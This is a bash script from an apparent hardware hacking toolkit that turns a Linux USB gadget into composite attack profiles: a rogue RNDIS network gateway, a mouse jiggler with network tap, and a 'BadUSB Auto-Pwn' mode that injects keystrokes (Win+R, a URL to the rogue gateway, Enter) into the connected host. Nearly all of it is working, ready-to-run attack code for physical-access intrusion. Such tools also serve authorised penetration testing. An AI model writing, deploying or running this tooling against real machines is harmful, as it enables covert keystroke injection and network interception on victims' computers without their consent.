#!/usr/bin/env bash
#
# hard-tools: usb_gadget/composite.sh
# Composite Multi-Gadget Attack Engine & Profile Manager
# Synchronizes multi-function USB gadget stacking (Mass Storage + HID + RNDIS + BadUSB)
#

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
ROOT_DIR="$(cd "${SCRIPT_DIR}/.." && pwd)"
LIB_DIR="${ROOT_DIR}/lib"
source "${LIB_DIR}/utils.sh"

MASS_STORAGE_BIN="${SCRIPT_DIR}/mass_storage_manager.sh"
BADUSB_BIN="${SCRIPT_DIR}/badusb.sh"
RNDIS_BIN="${SCRIPT_DIR}/rndis.sh"
HID_BIN="${SCRIPT_DIR}/hid.sh"
DUCKY_BIN="${ROOT_DIR}/operator/ducky.sh"

STATE_FILE="/tmp/composite_profile.state"

get_active_profile() {
    if [[ -f "${STATE_FILE}" ]]; then
        cat "${STATE_FILE}"
    else
        echo "none"
    fi
}

set_active_profile() {
    echo "$1" > "${STATE_FILE}"
}

clear_active_profile() {
    rm -f "${STATE_FILE}"
}

# ----------------- Profile 1: Ghost Drive -----------------
# CD-ROM ISO / Flash Drive + BadUSB RNDIS Network + Virtual Keyboard
start_ghost_drive() {
    print_header "Activating Composite Profile: GHOST DRIVE"
    log_info "Stacking: Mass Storage + BadUSB Rogue Gateway + Virtual Keyboard"

    unbind_udc

    # 1. Link Mass Storage
    link_function "mass_storage.0" "mass_storage.0"

    # 2. Link BadUSB RNDIS
    link_function "rndis.rndis" "rndis.rndis"

    # 3. Link HID Keyboard
    link_function "hid.keyboard" "hid.keyboard"

    bind_udc
    sleep 1

    # Start Rogue Gateway services on RNDIS
    local iface
    iface=$("${BADUSB_BIN}" status 2>/dev/null | grep "Network Interface:" | awk '{print $3}' || echo "rndis0")
    iface="${iface:-rndis0}"

    sudo bash "${BADUSB_BIN}" start corporate_wifi

    set_active_profile "ghost_drive"
    log_success "Profile GHOST DRIVE is ACTIVE."
}

# ----------------- Profile 2: Stealth Jiggler -----------------
# Mouse Jiggler + RNDIS Network Tap
start_stealth_jiggler() {
    print_header "Activating Composite Profile: STEALTH JIGGLER"
    log_info "Stacking: Precision Touchpad/Mouse Jiggler + RNDIS Network Gateway"

    unbind_udc

    # 1. Link RNDIS
    link_function "rndis.rndis" "rndis.rndis"

    # 2. Link HID Touchpad / Mouse
    link_function "hid.touchpad" "hid.touchpad"
    if [[ -d "${FUNCTIONS_DIR}/hid.mouse" ]]; then
        link_function "hid.mouse" "hid.mouse"
    fi

    bind_udc
    sleep 1

    # Start RNDIS DHCP server
    sudo bash "${RNDIS_BIN}" start

    # Start Mouse Jiggler in background
    sudo bash "${HID_BIN}" jiggle 20 3

    set_active_profile "stealth_jiggler"
    log_success "Profile STEALTH JIGGLER is ACTIVE."
}

# ----------------- Profile 3: BadUSB Auto-Pwn -----------------
# RNDIS Rogue Gateway + Automatic Keystroke Injection Trigger
start_badusb_autopwn() {
    print_header "Activating Composite Profile: BADUSB AUTO-PWN"
    log_info "Stacking: RNDIS Rogue Gateway + Immediate Keystroke Trigger"

    unbind_udc

    # 1. Link RNDIS
    link_function "rndis.rndis" "rndis.rndis"

    # 2. Link HID Keyboard
    link_function "hid.keyboard" "hid.keyboard"

    bind_udc
    sleep 1

    # Start BadUSB services
    sudo bash "${BADUSB_BIN}" start corporate_wifi

    log_info "Waiting 3 seconds for host USB enumeration & DHCP lease..."
    sleep 3

    log_info "Injecting browser trigger to target host..."
    # Press Win+R, type http://192.168.42.1/, press Enter
    sudo bash "${HID_BIN}" preset windows-run
    sleep 0.5
    sudo bash "${HID_BIN}" type "http://192.168.42.1/"
    sudo bash "${HID_BIN}" key ENTER

    set_active_profile "badusb_autopwn"
    log_success "Profile BADUSB AUTO-PWN executed and ACTIVE."
}

# ----------------- Stop All Composite Profiles -----------------
stop_composite() {
    print_header "Deactivating All Composite Profiles"
    local active
    active=$(get_active_profile)

    log_info "Stopping associated daemons..."
    # Stop jiggler
    sudo bash "${HID_BIN}" jiggle-stop 2>/dev/null || true

    # Stop BadUSB / RNDIS services
    sudo bash "${BADUSB_BIN}" stop 2>/dev/null || true
    sudo bash "${RNDIS_BIN}" stop 2>/dev/null || true

    # Unbind UDC and clear all composite symlinks
    unbind_udc
    unlink_function "mass_storage.0"
    unlink_function "rndis.rndis"
    unlink_function "hid.keyboard"
    unlink_function "hid.touchpad"
    unlink_function "hid.mouse"

    clear_active_profile
    log_success "All composite functions and profiles STOPPED."
}

status() {
    print_header "Composite Multi-Gadget Engine Status"
    local active
    active=$(get_active_profile)
    local udc
    udc=$(get_udc)

    echo -e "Active Composite Profile: ${COLOR_MAGENTA}${active^^}${COLOR_RESET}"
    echo -e "Active UDC Controller:    ${udc:-<unbound>}"
    echo
    echo "--- Active ConfigFS Linked Functions ---"
    local funcs
    funcs=$(list_active_functions)
    if [[ -n "${funcs}" ]]; then
        for f in "${funcs[@]}"; do
            echo -e "  * ${COLOR_GREEN}${f}${COLOR_RESET}"
        done
    else
        echo "  (No functions currently linked)"
    fi
    echo
}

menu() {
    while true; do
        print_header "Composite Multi-Gadget Attack Suite (Endpoint Safe)"
        status
        echo " 1) Arm 'Ghost Drive'      [CD-ROM ISO / Flash + Virtual KB]"
        echo " 2) Arm 'Stealth Jiggler'  [Mouse Anti-Sleep + RNDIS Network Tap]"
        echo " 3) Arm 'BadUSB Auto-Pwn'  [RNDIS Gateway + Instant Browser Trigger]"
        echo " 4) Stop All Active Composite Profiles"
        echo " 0) Back to Main Menu"
        echo
        read -rp "Choice: " choice
        case "$choice" in
            1) start_ghost_drive; press_enter ;;
            2) start_stealth_jiggler; press_enter ;;
            3) start_badusb_autopwn; press_enter ;;
            4) stop_composite; press_enter ;;
            0) break ;;
            *) c_red "Invalid option."; sleep 1 ;;
        esac
    done
}

case "${1:-}" in
    ghost|ghost_drive)        start_ghost_drive ;;
    stealth|stealth_jiggler)  start_stealth_jiggler ;;
    autopwn|badusb_autopwn)   start_badusb_autopwn ;;
    stop)                     stop_composite ;;
    status)                   status ;;
    menu|"")                  menu ;;
    *) echo "Usage: $0 {ghost|stealth|autopwn|stop|status|menu}" ;;
esac
